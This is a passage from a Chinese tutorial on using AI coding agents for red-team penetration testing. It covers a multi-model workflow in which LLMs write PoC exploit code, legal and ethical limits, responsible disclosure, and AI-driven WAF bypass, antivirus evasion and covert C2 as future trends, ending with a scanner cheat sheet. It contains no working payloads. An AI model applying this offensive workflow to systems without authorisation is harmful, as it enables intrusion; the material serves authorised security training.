    → 大规模自动化初筛 (成本优势)
    → 离线/air-gapped 环境

【8.3 多模型协同策略】

  最佳实践: 不同阶段用不同模型

```
  阶段1: 代码初筛 (范围广)
    → GPT-4o (速度快) 或 本地模型 (无隐私风险)
    → 标记出可疑代码片段

  阶段2: 深度分析 (精度高)
    → Claude 4 (能力强)
    → 对初筛结果进行深度分析，去伪存真

  阶段3: PoC 开发
    → Claude 4 (代码生成质量高)
    → 编写和调试利用代码

  阶段4: 报告生成
    → GPT-4o 或 DeepSeek (中文表达好)
    → 生成格式化的最终报告
```

## 九、法律与伦理边界

【9.1 核心原则】

  使用 AI Agent 进行安全测试时，以下原则不可逾越:

    没有授权 = 犯罪

  即使有了AI Agent的加持，也不能改变一个基本事实:
  未经授权的渗透测试 = 非法入侵计算机系统

  《中华人民共和国刑法》第285条:
    违反国家规定，侵入计算机信息系统，处三年以下有期徒刑或拘役

  《网络安全法》第27条:
    任何个人和组织不得从事非法侵入他人网络、干扰他人网络正常功能、
    窃取网络数据等危害网络安全的活动

【9.2 授权测试 vs 非法入侵的界限】

   合法 (有明确授权):
    - 公司内部红队测试 (有书面授权)
    - 漏洞赏金平台 (HackerOne, Bugcrowd, 补天, SRC) → 遵守平台规则
    - CTF 比赛
    - 自己的系统
    - 开源的漏洞演练环境 (DVWA, WebGoat, VulnHub, HackTheBox)

   非法 (无授权):
    - 扫描/测试任意互联网站点
    - 对竞争对手的系统进行渗透
    - 使用漏洞利用工具攻击非授权系统
    - 超出漏洞赏金平台范围的操作

【9.3 AI Agent 的特殊伦理考量】

  1. **自动化放大效应**: AI Agent 可以以远超人类的速度执行扫描和测试，
     这也意味着误操作的影响更大。必须确保 Agent 有充分的速率限制和范围控制。

  2. **指令范围**: 给 Agent 的指令必须明确限定测试范围。例如:
     - 好: "扫描 192.168.1.100 的 Web 端口"
     - 坏: "扫描这个网络" (可能扫到非授权目标)

  3. **数据安全**: 当使用云端 LLM (Claude API, GPT-4 API) 时:
     - 代码和数据会发送到 LLM 提供商的服务器
     - 如果审计的是敏感项目的代码，应使用本地模型
     - Anthropic / OpenAI 的 API 使用条款明确说明不会用 API 数据训练模型
     - 但仍需评估数据离开本机的风险

  4. **Agent 自主决策**: Agent 可能在执行过程中做出超出预期的决策。
     始终使用 Human-in-the-Loop 模式:
     - opencode 的权限系统 (allow / deny / ask)
     - 危险操作必须人工确认
     - 不要让 Agent 完全自主运行

  5. **漏洞利用的边界**: 验证漏洞存在 ≠ 深入利用:
     -  确认 SQL 注入存在 (使用 SLEEP, 或读取无害数据)
     -  导出整个数据库
     -  确认 RCE 存在 (执行 id 或 whoami)
     -  下载后门、建立持久化

【9.4 负责任漏洞披露 (Responsible Disclosure)】

  如果通过 AI Agent 发现了真实漏洞:

  1. 记录完整的漏洞详情 (使用 Agent 生成的技术报告)
  2. 通过合适的渠道通知受影响方 (SRC平台、security@邮箱)
  3. 给予合理的修复时间 (通常30-90天)
  4. 在漏洞修复后，可以适当分享经验 (隐去目标信息)
  5. 遵守当地法律和漏洞披露规范

【9.5 使用 AI Agent 的安全守则】

```

  AI Agent 安全使用守则                           |

  |
  □ 我只在获得明确书面授权后才执行渗透测试                        |
  |
  □ 我确保 Agent 的扫描范围严格限定在授权目标内                   |
  |
  □ 我设置了合理的扫描速率，避免影响目标系统的正常运行            |
  |
  □ 我对 Agent 的所有网络操作使用 Human-in-the-Loop 审查         |
  |
  □ 我不会将敏感的目标代码发送到不受信任的 LLM API               |
  |
  □ 我的漏洞验证仅限于无害操作，不进行破坏性利用                  |
  |
  □ 我对 Agent 生成的所有结果进行人工审核，不盲目信任             |
  |
  □ 我遵守漏洞赏金平台的规则和范围限制                            |
  |
  □ 我遵循负责任的漏洞披露原则                                    |
  |
  □ 我理解：Agent 是工具，我是责任人                              |
  |

```

## 十、未来展望

【10.1 多 Agent 协同系统】

  未来红队将越来越多地使用多 Agent 协作系统:

```

  多Agent红队系统                                |

  |
  |
  |  指挥官 Agent   | ← 人类红队队员 + AI 战略规划               |
  |  (Orchestrator) |    制定攻击计划，调度子Agent               |
  |
  |                                                      |
  |
  |     |                         |                            |
  |
  |
  | 侦察  | | 漏洞挖掘  |  |  利用开发Agent    |                   |
  | Agent | |  Agent    |  |  (Exploit Dev)    |                   |
  |       | |           |  |                   |                   |
  |•子域名| |•代码审计  |  |•PoC编写           |                   |
  |•端口  | |•配置审查  |  |•Exploit调优       |                   |
  |•指纹  | |•漏洞扫描  |  |•Payload生成       |                   |
  |
  |            |                |                              |
  |
  |
  |
  |  报告生成 Agent       |                                     |
  |  (Report Writer)     |                                     |
  |                      |                                     |
  |• 汇总所有发现         |                                     |
  |• 生成渗透测试报告     |                                     |
  |• 提出修复建议         |                                     |
  |
  |

```

【10.2 持续自主安全测试 (Continuous Autonomous Security Testing)】

  未来趋势: 将 AI Agent 集成到 CI/CD 流水线中:

  - 每次代码提交时自动触发安全审计 Agent
  - 自动对变更代码进行安全影响分析
  - 自动运行回归安全测试 (确认没有引入新漏洞)
  - 自动生成安全报告并分发给安全团队

  Google 已在内部使用类似系统 (通过 AI 辅助代码审查)

【10.3 AI驱动的防御绕过】

  攻击方视角:
  - AI 自动检测 WAF 规则并生成绕过 payload
  - AI 分析杀软检测模式，生成免杀 shellcode
  - AI 模拟正常流量模式，实现隐蔽 C2 通信

  防御方视角:
  - AI 驱动的异常检测 (UEBA)
  - AI 辅助的威胁狩猎 (Threat Hunting)
  - 自动化的 SOAR (Security Orchestration, Automation and Response)

  这将形成一个持续的攻防对抗:
    攻击 AI 进化 → 防御 AI 进化 → 攻击 AI 再进化 → ...

【10.4 人类红队队员角色的演变】

  在 AI Agent 时代，人类红队队员的角色将演变为:

  **从执行者 → 决策者**
    - AI 负责执行具体的扫描和测试
    - 人类负责选择攻击路径、判断结果、做出战略决策

  **从单打独斗 → 团队指挥官**
    - 管理多个 AI Agent 组成的"数字红队"
    - 协调 Agent 之间的信息共享和任务分配

  **从技术专家 → 安全架构师**
    - 设计攻击策略和测试方案
    - 评估 AI Agent 的输出质量
    - 发现 AI 难以察觉的复杂逻辑漏洞

  不变的是:
    **人类始终承担最终责任**
    **创造力和战略思维仍无法被AI替代**
    **真正的安全专家永远稀缺**

【10.5 推荐学习路径】

  结合本系列其他教程，建议按以下顺序学习:

  1. [[总目录与快速查询]] — 了解完整的红队知识体系
  2. [[ArchStrike新手安装教程]] — 搭建基础工具环境
  3. [[补充-Python黑客脚本基础]] — 掌握编程基础
  4. [[补充-进阶学习与缺失领域分析]] — 定位知识缺口
  5. archstrike-recon教学 — 掌握传统侦察技术
  6. archstrike-web教学 — 理解 Web 漏洞原理
  7. 本文档 — 将 AI Agent 融入工作流
  8. 持续实践 → 漏洞赏金平台 (补天, 漏洞盒子, HackerOne)

附录A: 常用安全工具速查表

```

  工具         | 用途           | 集成方式              | 常用命令 |

  nmap         | 端口扫描       | MCP / subprocess       | nmap -sV |
  masscan      | 高速端口扫描   | subprocess             | -p1-65535|
  naabu        | Go端口扫描     | subprocess             | 快速扫描  |
  sqlmap       | SQL注入检测    | subprocess (--batch)   | 需授权!   |
  nuclei       | 漏洞扫描       | subprocess / MCP       | -severity |
  ffuf         | Web Fuzzing   | subprocess             | -w dict   |
  subfinder    | 子域名枚举     | subprocess             | -d domain |
  amass        | 子域名枚举     | subprocess             | enum      |
  puredns      | DNS解析        | subprocess             | resolve   |
  httpx        | HTTP探测       | subprocess             | -tech-dt  |
  whatweb      | Web指纹        | subprocess             | --no-err  |
  gowitness    | Web截图        | subprocess             | 报告用    |
  Burp Suite   | Web代理        | 独立工具 (不集成)      | 手工测试  |
  Metasploit   | 漏洞利用框架   | 独立工具 (不集成)      | msfconsole|
  Ghidra       | 逆向工程       | 独立工具 (不集成)      | 二进制分析 |
  Wireshark    | 流量分析       | 独立工具 (不集成)      | 网络分析  |

```

附录B: 参考资源

  工具与项目:
    - opencode: https://github.com/anomalyco/opencode
    - MCP 协议: https://modelcontextprotocol.io
    - LangChain: https://www.langchain.com
    - OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
    - PayloadAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
    - SecLists: https://github.com/danielmiessler/SecLists
    - Nuclei Templates: https://github.com/projectdiscovery/nuclei-templates

  漏洞数据库:
    - NVD (National Vulnerability Database): https://nvd.nist.gov
    - Exploit-DB: https://www.exploit-db.com
    - MITRE ATT&CK: https://attack.mitre.org
    - CWE Top 25: https://cwe.mitre.org/top25/

  练习平台:
    - HackTheBox: https://www.hackthebox.com
    - TryHackMe: https://tryhackme.com
    - PentesterLab: https://pentesterlab.com
    - PortSwigger Web Security Academy: https://portswigger.net/web-security
    - VulnHub: https://www.vulnhub.com

  中文漏洞平台 (SRC):
    - 补天漏洞响应平台: https://www.butian.net
    - 漏洞盒子: https://www.vulbox.com
    - 腾讯SRC: https://security.tencent.com
    - 阿里SRC: https://security.alibaba.com

  本章总结

  AI Agent 正在深刻改变红队渗透测试的工作方式。核心变化不是"AI替代人"，
  而是"一个人 + AI = 一个团队"。

  通过本文档，你应该已经掌握了:
     理解 AI Coding Agent 的安全改造原理
     会配置 opencode 的红队专用 Agent 和 Skill
     能编写 AGENTS.md 定义安全审计角色
     了解 MCP 协议如何集成安全工具
     知道如何搭建代码审计和侦察两种 Agent
     理解法律边界和伦理底线

  下一步:
    → 实际安装 opencode 并配置你的第一个红队 Agent
    → 找一个开源项目 (如 DVWA, WebGoat) 进行审计练习
    → 参与漏洞赏金平台，将 AI Agent 用于真实的授权测试
    → 回到 [[总目录与快速查询]] 继续系统学习

  Remember: AI is your amplifier, not your replacement.
  The human remains the most critical component in the loop.

